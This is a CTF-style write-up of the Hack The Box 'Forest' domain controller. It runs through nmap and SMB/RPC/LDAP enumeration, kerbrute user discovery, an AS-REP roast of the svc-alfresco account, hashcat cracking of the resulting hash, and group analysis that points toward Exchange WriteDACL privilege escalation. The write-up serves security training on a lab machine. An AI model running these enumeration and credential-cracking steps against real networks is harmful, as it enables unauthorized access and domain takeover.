@@ -1,0 +1,1223 @@
+---
+Primary_category: "[[EASY]]"
+title: FOREST
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[EASY]]
+
+#### Summary
+
+- ***Summary A***
+- ***Summary B***
+- ***Summary C***
+- ***Summary D***
+- ***Summary E***
+
+![[FOREST-20250924172224837.webp|400]]
+
+---
+
+#### *Setup*
+
+Directory creation with the Machine's Name
+
+```bash
+mkdir Forest && cd !$
+```
+
+Creation of a *Pentesting Folder Structure* to store all the information related to the target
+
+```bash
+mkdir {Data,Scans,Tools}
+```
+
+---
+
+#### *Recon #1*
+
+##### *OS Identification*
+
+First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*
+
+The standard values are →
+
+- ***About 64 → Linux***
+- ***About 128 → Windows***
+
+```bash
+ping -c1 10.129.114.75
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> PING 10.129.114.75 (10.129.114.75) 56(84) bytes of data.
+> 64 bytes from 10.129.114.75: icmp_seq=1 ttl=127 time=52.4 ms
+> 
+> --- 10.129.114.75 ping statistics ---
+> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
+> rtt min/avg/max/mdev = 52.444/52.444/52.444/0.000 ms
+> ```
+>
+
+As mentioned, according to the TTL, It seems that It is a ***LINUX/WINDOWS Target***
+
+##### *Port Scanning*
+
+###### *General Scan*
+
+Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine
+
+The Scan result is exported in a grepable format for subsequent *Port Parsing*
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG forest.allPorts 10.129.114.75
+```
+
+> [!BUG]- *forest.allPorts*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Wed Sep 24 17:30:49 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG forest.allPorts 10.129.114.75
+> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+> Host: 10.129.114.75 ()	Status: Up
+> Host: 10.129.114.75 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49668/open/tcp/////, 49670/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49684/open/tcp/////, 49698/open/tcp/////, 60285/open/tcp/////
+> # Nmap done at Wed Sep 24 17:31:04 2025 -- 1 IP address (1 host up) scanned in 14.45 seconds
+> ```
+>
+
+**Open Ports → **
+
+```bash
+53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, 49664, 49665, 49666, 49668, 49670, 49676, 49677, 49684, 49698 and 60285
+```
+
+###### *Comprehensive Scan*
+
+We can apply a little filter to the *forest.allPorts* file to extract the ports and conduct a more comprehensive scan on them by extracting the services and their version running on each port and also executing some default scripts to gather more information
+
+>  ***Note that this scan is also exported to have evidence at hand***
+
+```bash
+nmap -p$( grep -ioP --color -- '\d{1,5}(?=/open)' forest.allPorts | xargs | sed 's@\s@,@g' ) -sCV -n -Pn --disable-arp-ping -oN forest.targeted 10.129.114.75
+```
+
+> [!BUG]- *forest.targeted*
+>
+> ```bash
+> # Nmap 7.94SVN scan initiated Thu Sep 25 15:46:32 2025 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49684,49698,60285 -sCV -n -Pn --disable-arp-ping -oN forest.targeted 10.129.95.210
+> Nmap scan report for 10.129.95.210
+> Host is up (0.11s latency).
+> 
+> PORT      STATE  SERVICE      VERSION
+> 53/tcp    open   domain       Simple DNS Plus
+> 88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-25 13:53:43Z)
+> 135/tcp   open   msrpc        Microsoft Windows RPC
+> 139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
+> 389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+> 445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+> 464/tcp   open   kpasswd5?
+> 593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
+> 636/tcp   open   tcpwrapped
+> 3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+> 3269/tcp  open   tcpwrapped
+> 5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+> |_http-server-header: Microsoft-HTTPAPI/2.0
+> |_http-title: Not Found
+> 9389/tcp  open   mc-nmf       .NET Message Framing
+> 47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+> |_http-server-header: Microsoft-HTTPAPI/2.0
+> |_http-title: Not Found
+> 49664/tcp open   msrpc        Microsoft Windows RPC
+> 49665/tcp open   msrpc        Microsoft Windows RPC
+> 49666/tcp open   msrpc        Microsoft Windows RPC
+> 49668/tcp open   msrpc        Microsoft Windows RPC
+> 49670/tcp closed unknown
+> 49676/tcp closed unknown
+> 49677/tcp closed unknown
+> 49684/tcp closed unknown
+> 49698/tcp closed unknown
+> 60285/tcp closed unknown
+> Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+> 
+> Host script results:
+> | smb-security-mode: 
+> |   account_used: guest
+> |   authentication_level: user
+> |   challenge_response: supported
+> |_  message_signing: required
+> | smb2-security-mode: 
+> |   3:1:1: 
+> |_    Message signing enabled and required
+> |_clock-skew: mean: 2h27m05s, deviation: 4h02m32s, median: 7m03s
+> | smb-os-discovery: 
+> |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+> |   Computer name: FOREST
+> |   NetBIOS computer name: FOREST\x00
+> |   Domain name: htb.local
+> |   Forest name: htb.local
+> |   FQDN: FOREST.htb.local
+> |_  System time: 2025-09-25T06:54:37-07:00
+> | smb2-time: 
+> |   date: 2025-09-25T13:54:34
+> |_  start_date: 2025-09-25T13:50:16
+> 
+> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+> # Nmap done at Thu Sep 25 15:47:41 2025 -- 1 IP address (1 host up) scanned in 69.37 seconds
+> ```
+>
+
+##### *139, 445 - SMB*
+
+Based on the ports the host has opened, we can nearly ensure that we are facing a *DC (Domain Controller)*
+
+Therefore, let's gather some information about the target
+
+```bash
+nxc smb 10.129.95.210
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SMB                      10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+> ```
+>
+
+In the above command we have extracted the host name, the *installed OS Version*, the domain name and relevant information such as the state of the *SMB Signing* security mechanism on the *SMB Server* and if it supports *SMBv1*
+
+By default, *SMB signing* is enabled on *DCs*, this ensures that an operator cannot perform an *SMB relay* to the *DC* in order to authenticate as the victim
+
+Since our target may be a *WS 2016*, we should know that *PKINIT Key Trust* authentication is supported as of that version, which means an operator could carry out action such as a *[[SHADOW CREDENTIALS|Shadow Credentials]]* attack through *[[DACL ABUSE|DACL Abuse]]* or a *NTLM/Kerberos relay attack*
+
+For the time being, let's add an entry on the */etc/hosts* file related to the target's name and the domain
+
+```bash
+printf "%s\t%s\t%s\t%s" "10.129.95.210" "forest" "htb.local" "forest.htb.local" >> /etc/hosts
+```
+
+> [!BUG]- */etc/hosts*
+>
+> ```bash
+> # Host addresses
+> 127.0.0.1  localhost
+> 127.0.1.1  parrot
+> ::1        localhost ip6-localhost ip6-loopback
+> ff02::1    ip6-allnodes
+> ff02::2    ip6-allrouters
+> 
+> # Custom Local Lab
+> 192.168.1.133   4l3x-pc
+> 192.168.1.100   dc01 DC01 dc01.lab.local lab.local
+> 192.168.1.142   ws01  ws01.lab.local
+> 
+> # HTB Machines
+> 10.129.95.210	forest	htb.local	forest.htb.local
+> ```
+>
+
+This name resolution is really important when interacting with the target's *KDC*, all the *Kerberos stuff* and so on
+
+Now, we can proceed to list the available shares on the remote target aside from the usual ones such as *ADMIN$*, *SYSVOL*, *IPC*...
+
+As we do not have any valid credentials, we could try with a *Null Authentication* followed by a non-existent and the *Guest* user
+
+###### *Null Authentication*
+
+```bash
+nxc smb 10.129.95.210 --username '' --password '' --shares
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SMB                      10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+> SMB                      10.129.95.210   445    FOREST           [+] htb.local\: 
+> SMB                      10.129.95.210   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
+> ```
+>
+
+###### *Non-existent user*
+
+```bash
+nxc smb 10.129.95.210 --username 'anyRandomUser' --password '' --shares
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SMB                      10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+> SMB                      10.129.95.210   445    FOREST           [-] htb.local\anyRandomUser: STATUS_LOGON_FAILURE 
+> ```
+>
+
+###### *Guest Authentication*
+
+```bash
+nxc smb 10.129.95.210 --username 'guest' --password ''
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SMB                      10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+> SMB                      10.129.95.210   445    FOREST           [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 
+> ```
+>
+
+But we get nothing though
+
+- ***An ACCESS_DENIED error in NULL Authentication***
+
+- ***An STATUS_LOGON_FAILURE error as the user we tried does not exist***
+
+- ***An STATUS_ACCOUNT_DISABLED*** as the guest account is disabled by default
+
+For the time being, we cannot do anymore here, let's move on
+
+##### *53 - DNS*
+
+If we had valid domain credentials, we could use tools such as ***[adidnsdump](https://github.com/dirkjanm/adidnsdump)*** to list all the existent records on the *DNS Zone* related to the domain
+
+Doing so works as any domain user has read access on the *child objects* of the *Domain DNS Zone* i.e. all the existent *DNS records*
+
+However, we currently know that the domain is *htb.local*, so we could try a *DNS Zone transfer* against the *DC* in order to dump all the *DNS records*
+
+This cannot be carried out by default, but we will try it as follows
+
+```bash
+dig axfr htb.local @10.129.95.210
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr htb.local @10.129.95.210
+> ;; global options: +cmd
+> ; Transfer failed.
+> ```
+>
+
+But the transfer fails...
+
+##### *88 - Kerberos*
+
+In order to perform some *kerberos-related attacks*  such as *[[KERBEROAST|kerberoasting]]* or *[[ASREPROAST|asreproast]]* attack, at least it is necessary to have a list with valid users
+
+A solid userlist could be created with ease using some passive or active methods
+
+In this case, since this time we are facing a *HTB machine*, there is no external data we can gather through *OSINT*, so an operator could use tools such as ***[kerbrute](https://github.com/ropnop/kerbrute)*** in order to enumerate valid users according to some *Kerberos builting errors*
+
+```bash
+git clone https://github.com/ropnop/kerbrute kerbrute
+```
+
+```bash
+cd !$ && go build -ldflags "-s -w" .
+```
+
+The above commands are related to *kerbrute's setup*. Next, we pass a dictionary from ***[statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)*** to *kerbrute's userenum module*
+
+```bash
+kerbrute userenum --dc 10.129.95.210 --domain htb.local /usr/share/statistically-likely-usernames/john.txt
+```
+
+> [!NOTE]- *Command Output*
+> 
+> ```bash
+>     __             __               __     
+>    / /_____  _____/ /_  _______  __/ /____ 
+>   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+>  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+> /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+> 
+> Version: dev (n/a) - 09/25/25 - Ronnie Flathers @ropnop
+> 
+> 2025/09/25 16:45:39 >  Using KDC(s):
+> 2025/09/25 16:45:39 >  	10.129.95.210:88
+> 
+> 2025/09/25 16:45:39 >  [+] VALID USERNAME:	mark@htb.local
+> 2025/09/25 16:45:40 >  [+] VALID USERNAME:	andy@htb.local
+> 2025/09/25 16:45:52 >  [+] VALID USERNAME:	sebastien@htb.local
+> 2025/09/25 16:45:55 >  [+] VALID USERNAME:	lucinda@htb.local
+> 2025/09/25 16:45:59 >  [+] VALID USERNAME:	santi@htb.local
+> 2025/09/25 16:46:49 >  Done! Tested 8477 usernames (5 valid) in 70.760 seconds
+> ```
+>
+
+And we found that the following usernames correspond to valid domain user accounts
+
+```bash
+mark
+andy
+sebastien
+lucinda
+santi
+```
+
+With the above data, we can carry out an *ASREPRoast attack* to check if any of those user accounts have the *USER_DONT_RE_PREAUTH* flag enabled in the *User Account Control attribute*
+
+But before that, let's check if we can gather more information
+
+##### *135 - RPC*
+
+On this port is listening the *RPC Endpoint Mapper*, whose purpose is to map any available *RPC Endpoint* to a certain *dynamic port* or *namedpipe*
+
+We can use a tool such as ***[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)*** to try to authenticate to the *DC* without any valid credentials
+
+Just try another *Null Authentication* to do so
+
+```bash
+rpcclient --user '' --no-pass forest.htb.local --command 'enumdomusers'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> user:[Administrator] rid:[0x1f4]
+> user:[Guest] rid:[0x1f5]
+> user:[krbtgt] rid:[0x1f6]
+> user:[DefaultAccount] rid:[0x1f7]
+> user:[$331000-VK4ADACQNUCA] rid:[0x463]
+> user:[SM_2c8eef0a09b545acb] rid:[0x464]
+> user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+> user:[SM_75a538d3025e4db9a] rid:[0x466]
+> user:[SM_681f53d4942840e18] rid:[0x467]
+> user:[SM_1b41c9286325456bb] rid:[0x468]
+> user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+> user:[SM_7c96b981967141ebb] rid:[0x46a]
+> user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+> user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+> user:[HealthMailboxc3d7722] rid:[0x46e]
+> user:[HealthMailboxfc9daad] rid:[0x46f]
+> user:[HealthMailboxc0a90c9] rid:[0x470]
+> user:[HealthMailbox670628e] rid:[0x471]
+> user:[HealthMailbox968e74d] rid:[0x472]
+> user:[HealthMailbox6ded678] rid:[0x473]
+> user:[HealthMailbox83d6781] rid:[0x474]
+> user:[HealthMailboxfd87238] rid:[0x475]
+> user:[HealthMailboxb01ac64] rid:[0x476]
+> user:[HealthMailbox7108a4e] rid:[0x477]
+> user:[HealthMailbox0659cc1] rid:[0x478]
+> user:[sebastien] rid:[0x479]
+> user:[lucinda] rid:[0x47a]
+> user:[svc-alfresco] rid:[0x47b]
+> user:[andy] rid:[0x47e]
+> user:[mark] rid:[0x47f]
+> user:[santi] rid:[0x480]
+> ```
+>
+
+In this case it works, so we can list a bunch of information related to *htb.local* domain
+
+For the attack we are pursuing, we just need all the user accounts. So, let's filter the above data to extract only the user accounts
+
+```bash
+rpcclient --user '' --no-pass forest.htb.local --command 'enumdomusers' | grep -ioP --color -- '^user:\[\K[\w\-_]+(?=\])' > users.list
+```
+
+> [!BUG]- *users.list*
+>
+> ```bash
+> Administrator
+> Guest
+> krbtgt
+> DefaultAccount
+> SM_2c8eef0a09b545acb
+> SM_ca8c2ed5bdab4dc9b
+> SM_75a538d3025e4db9a
+> SM_681f53d4942840e18
+> SM_1b41c9286325456bb
+> SM_9b69f1b9d2cc45549
+> SM_7c96b981967141ebb
+> SM_c75ee099d0a64c91b
+> SM_1ffab36a2f5f479cb
+> HealthMailboxc3d7722
+> HealthMailboxfc9daad
+> HealthMailboxc0a90c9
+> HealthMailbox670628e
+> HealthMailbox968e74d
+> HealthMailbox6ded678
+> HealthMailbox83d6781
+> HealthMailboxfd87238
+> HealthMailboxb01ac64
+> HealthMailbox7108a4e
+> HealthMailbox0659cc1
+> sebastien
+> lucinda
+> svc-alfresco
+> andy
+> mark
+> santi
+> ```
+>
+
+These are all the existent user accounts on *htb.local* domain
+
+However, let's dig a bit more to see if we can gather more data through *LDAP*
+
+##### *389, 636 - LDAP*
+
+Before proceed with any known attack, let's see if we can carry out an anonymous bind to the *LDAP Server*
+
+```bash
+ldapsearch -x -H 'ldap://forest.htb.local' -LLL -b 'dc=htb,dc=local' | head
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> dn: DC=htb,DC=local
+> objectClass: top
+> objectClass: domain
+> objectClass: domainDNS
+> distinguishedName: DC=htb,DC=local
+> instanceType: 5
+> whenCreated: 20190918174549.0Z
+> whenChanged: 20250925135005.0Z
+> subRefs: DC=ForestDnsZones,DC=htb,DC=local
+> subRefs: DC=DomainDnsZones,DC=htb,DC=local
+> ```
+>
+
+The anonymous binding was sucessful. We can use the following filter on *ldapsearch* to extract most of the *user accounts*
+
+```bash
+ldapsearch -x -H 'ldap://forest.htb.local' -LLL -b 'dc=htb,dc=local' '(|(ObjectClass=person)(ObjectClass=user))' samAccountName | grep -i -- 'samAccountName'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> sAMAccountName: Guest
+> sAMAccountName: DefaultAccount
+> sAMAccountName: FOREST$
+> sAMAccountName: EXCH01$
+> sAMAccountName: $331000-VK4ADACQNUCA
+> sAMAccountName: SM_2c8eef0a09b545acb
+> sAMAccountName: SM_ca8c2ed5bdab4dc9b
+> sAMAccountName: SM_75a538d3025e4db9a
+> sAMAccountName: SM_681f53d4942840e18
+> sAMAccountName: SM_1b41c9286325456bb
+> sAMAccountName: SM_9b69f1b9d2cc45549
+> sAMAccountName: SM_7c96b981967141ebb
+> sAMAccountName: SM_c75ee099d0a64c91b
+> sAMAccountName: SM_1ffab36a2f5f479cb
+> sAMAccountName: HealthMailboxc3d7722
+> sAMAccountName: HealthMailboxfc9daad
+> sAMAccountName: HealthMailboxc0a90c9
+> sAMAccountName: HealthMailbox670628e
+> sAMAccountName: HealthMailbox968e74d
+> sAMAccountName: HealthMailbox6ded678
+> sAMAccountName: HealthMailbox83d6781
+> sAMAccountName: HealthMailboxfd87238
+> sAMAccountName: HealthMailboxb01ac64
+> sAMAccountName: HealthMailbox7108a4e
+> sAMAccountName: HealthMailbox0659cc1
+> sAMAccountName: sebastien
+> sAMAccountName: lucinda
+> sAMAccountName: andy
+> sAMAccountName: mark
+> sAMAccountName: santi
+> ```
+>
+
+---
+
+#### *Exploitation*
+
+##### *ASREPRoast Attack*
+
+> ***[[ASREPROAST|Reference]]***
+
+As mentioned, an operator with a list of valid user accounts belonging to the domain can perform this type of attack using an ***[impacket](https://github.com/fortra/impacket)*** tool called ***[GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)***
+
+```bash
+GetNPUsers.py -dc-ip forest.htb.local -request -outputfile htb_local.hashes -format hashcat -usersfile ./users.list 'htb.local/'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+> [-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+> $krb5asrep$23$svc-alfresco@HTB.LOCAL:c6575f81a28197e9d40683a9c88177eb$65b465d2733b6b40cfb70d321a516a9632ec774bf78b4ef01c1f9f75d462906b942772e41fe69a30c1c3899f9a8e14074cba336382d62926b3127e66c1d5713e6ccf612eea015bf80c35f305da2a61745de8ace229b7dbc285b3fb7c22e3ecc3e4a12fccf812835d1efa760e66181394cf3334c9e17427c32e2f2798c5ac1ee23ab1a54586d3bd5574e0c26bbeee722b6d22ff51f40fbf968fd0a5baeac95e9d1ba9b95f33aef889be321ac9b250fa1f0e8d7e4038e69d8ff7a41119fb87ee931217d094976f0f2a9a473733067b31806cc3cf501532318030e1aa36564ddbbf4b70ce588945
+> [-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+> [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+> ```
+>
+
+And we have a match related to *svc-alfresco* user account
+
+As we indicated an output file on the above command, we can pass the file containing the *crackeable hash* to *hashcat*
+
+In this case, the *hash type* for the provided *hash* is *18200*. However, remember that anyone can use the following command to search for an specific *hash type*
+
+```bash
+hashcat --example-hashes | less
+```
+
+Therefore, just proceed as follows →
+
+```bash
+hashcat --force -O --attack-mode 0 --hash-type 18200 htb_local.hashes /usr/share/wordlists/rockyou.txt
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> hashcat (v6.2.6) starting
+> 
+> You have enabled --force to bypass dangerous warnings and errors!
+> This can hide serious problems and should only be done when debugging.
+> Do not report hashcat issues encountered when using --force.
+> 
+> OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+> ==================================================================================================================================================
+> * Device #1: pthread-haswell-13th Gen Intel(R) Core(TM) i7-13700H, 6925/13914 MB (2048 MB allocatable), 16MCU
+> 
+> Minimum password length supported by kernel: 0
+> Maximum password length supported by kernel: 31
+> 
+> Hashes: 1 digests; 1 unique digests, 1 unique salts
+> Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+> Rules: 1
+> 
+> Optimizers applied:
+> * Optimized-Kernel
+> * Zero-Byte
+> * Not-Iterated
+> * Single-Hash
+> * Single-Salt
+> 
+> Watchdog: Temperature abort trigger set to 90c
+> 
+> Host memory required for this attack: 4 MB
+> 
+> Dictionary cache hit:
+> * Filename..: /usr/share/wordlists/rockyou.txt
+> * Passwords.: 14344390
+> * Bytes.....: 139921565
+> * Keyspace..: 14344390
+> 
+> $krb5asrep$23$svc-alfresco@HTB.LOCAL:c6575f81a28197e9d40683a9c88177eb$65b465d2733b6b40cfb70d321a516a9632ec774bf78b4ef01c1f9f75d462906b942772e41fe69a30c1c3899f9a8e14074cba336382d62926b3127e66c1d5713e6ccf612eea015bf80c35f305da2a61745de8ace229b7dbc285b3fb7c22e3ecc3e4a12fccf812835d1efa760e66181394cf3334c9e17427c32e2f2798c5ac1ee23ab1a54586d3bd5574e0c26bbeee722b6d22ff51f40fbf968fd0a5baeac95e9d1ba9b95f33aef889be321ac9b250fa1f0e8d7e4038e69d8ff7a41119fb87ee931217d094976f0f2a9a473733067b31806cc3cf501532318030e1aa36564ddbbf4b70ce588945:s3rvice
+>                                                           
+> Session..........: hashcat
+> Status...........: Cracked
+> Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+> Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:c6575f81a28197...588945
+> Time.Started.....: Thu Sep 25 18:35:51 2025, (2 secs)
+> Time.Estimated...: Thu Sep 25 18:35:53 2025, (0 secs)
+> Kernel.Feature...: Optimized Kernel
+> Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+> Guess.Queue......: 1/1 (100.00%)
+> Speed.#1.........:  3377.4 kH/s (2.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+> Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+> Progress.........: 4096930/14344390 (28.56%)
+> Rejected.........: 930/4096930 (0.02%)
+> Restore.Point....: 4080545/14344390 (28.45%)
+> Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+> Candidate.Engine.: Device Generator
+> Candidates.#1....: s8704908f -> s-e-r-g-i-o-
+> Hardware.Mon.#1..: Util: 35%
+> 
+> Started: Thu Sep 25 18:35:50 2025
+> Stopped: Thu Sep 25 18:35:54 2025
+> ```
+>
+
+So, the password is **`s3rvice`**
+
+We can validate it using ***[netexec](https://github.com/Pennyw0rth/NetExec)***
+
+```bash
+nxc smb forest.htb.local --username 'svc-alfresco' --password 's3rvice'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> SMB                      10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+> SMB                      10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+> ```
+>
+
+---
+
+#### *Recon #2*
+
+Once we have valid domain credentials, as is the case, the game begins 😈
+
+Before deploying ***[Bloodhound](https://github.com/SpecterOps/BloodHound)***, let's use ***[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)*** to extract all the relevant information about the domain such as users, groups, *GPOs*, computers and so on
+
+```bash
+git clone https://github.com/dirkjanm/ldapdomaindump ldapdomaindump
+```
+
+```bash
+cd !$ && python3 -m venv .venv
+. !$/bin/activate && pip3 install -r requirements.txt
+```
+
+```bash
+mkdir htb_local.data
+cd !$ && python3 ldapdomaindump.py --user 'htb.local\svc-alfresco' --password 's3rvice' --no-json --no-grep 'forest.htb.local'
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> [*] Connecting to host...
+> [*] Binding to host
+> [+] Bind OK
+> [*] Starting domain dump
+> [+] Domain dump finished
+> ```
+>
+
+Next, build an *HTTP Server* as follows and browse the data
+
+```bash
+python3 -m http.server 80
+```
+
+![[FOREST-20250925185117025.webp|350]]
+
+> ***Zoom in***
+
+The interesting part lies on the *domain_users_by_group.html* file
+
+Let's link the data in order to look for any possible *privesc vector*
+
+- ***SVC-Alfresco user account belongs to the Service Accounts Group***
+
+![[FOREST-20250925185519205.webp|400]]
+
+- ***Service Accounts group belongs to Privileged IT Accounts***
+
+> ***Zoom in***
+
+![[FOREST-20250925185656214.webp|400]]
+
+> ***Zoom in***
+
+- ***Privileged IT Accounts group is member of Remote Management Users and Accounts Operators groups***
+
+This tells us many things
+
+First, we can establish a *WinRM Session via Powershell Remoting (MS-PSRP)* using *evil-winrm* as *svc-alfresco* belongs indirectly to *RMU* and *Account Operators* groups due to nested group membership
+
+Members of both groups are allowed to establish a remote connection via *WinRM* with the *Domain Controller*
+
+Next, since we belong to the *Accounts Operators* group, we are able to create any user account and manage most of the groups membership, except for high privilege user and groups such as →
+
+| ***Group*** |
+| --- |
+| ***Domain Admins*** |
+| ***Schema Admins*** |
+| ***Enterprise Admins*** |
+| ***Server Operators*** |
+| ***Account Operators*** |
+| ***Backup Operators*** |
+| ***Print Operators*** |
+
+So, we cannot directly add a user that we create to those privileged groups, which would be an easy win
+
+But, an attacker can leverage certain groups for privilege scalation
+
+One of these groups is the *DNS Admins*
+
+Another group, if *Exchange* installed, is the *Exchange Windows Permissions* group
+
+In this case, it seems that *Microsoft Exchange* was deployed ealier on this *DC*, so we can proceed as follows
+
+It is known that most of the *Exchange* groups created on an *AD* environment have certain privileges on the domain object and so on
+
+By default, *Exchange Windows Permissions* group has *WriteDACL* right over the *Domain Object*, identified as *"dc=local,dc=htb"*
+
